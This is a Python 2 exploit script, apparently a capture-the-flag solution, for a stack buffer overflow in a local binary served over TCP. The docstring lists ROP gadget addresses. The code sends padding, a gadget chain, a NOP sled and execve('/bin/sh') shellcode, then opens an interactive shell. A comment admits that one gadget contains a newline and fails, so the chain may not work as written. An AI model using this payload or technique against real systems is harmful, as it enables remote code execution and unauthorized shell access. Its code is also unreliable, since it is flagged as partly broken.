#! /usr/bin/env python2
# -*- coding: utf-8 -*-
"""
bof -> 'A'*16 + rbp + ret addr



0x00000000004006ec : call rax
0x0000000000400deb : call rdi
0x0000000000400835 : call rdx

0x0000000000400b10 : mov edi, dword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret


0x0000000000400aea : call qword ptr [rsp + rbx*8]

rbx -> 0x20
"""
import socket
import telnetlib
import struct

p64 = lambda data: struct.pack("Q", data)
u64 = lambda data: struct.unpack("Q", data)[0]
p32 = lambda data: struct.pack("I", data)
u32 = lambda data: struct.unpack("I", data)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(60)
s.connect(('127.0.0.1', 9010))
# socat TCP-LISTEN:<port>,reuseaddr,fork EXEC:"./bin"

def recvall():
    out = ""
    while True:
        try:
            out += s.recv(1)
        except socket.timeout:
            return out

def recvline(keepends=False):
    return recvuntil('\n', keepends)

def recvlines(numlines, keepends=False):
    b = ""
    for i in xrange(numlines):
        b += recvline(keepends)
    return b

def recv(n=4096):
    b = ""
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

def recvuntil(check, keepends=True):
    b = ""
    while check not in b:
        b += s.recv(1)
    if keepends is False:
        b = b[:-len(check)]
    return b

def sendlineafter(after, msg):
    recvuntil(after)
    sendline(msg)

def sendafter(after, msg):
    recvuntil(after)
    send(msg)

def sendline(msg):
    s.send(msg + '\n')

def send(msg):
    s.send(msg)

def interactive():
    print 'interactive:'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def main():
    shellcode = "\x31\xC0\x99\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x31\xF6\xB0\x3B\x0F\x05"
    recvuntil("hey, what's your name? : ")
    sendline('username')
    recvuntil("> ")
    sendline('1')
    pad      = 'A' * 32
    payload  = ''
    payload += p64(1) # rbp
    payload += p64(0x400761) # : pop rbx ; pop rbp ; ret
    payload += p64(1) # rbx
    payload += p64(1) # rbp
    payload += p64(0x400aea) # call qword ptr [rsp + rbx*8] -> tiene un \n no funca
    payload += "\x90" * 8
    payload += shellcode
    sendline(pad + payload)
    interactive()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass


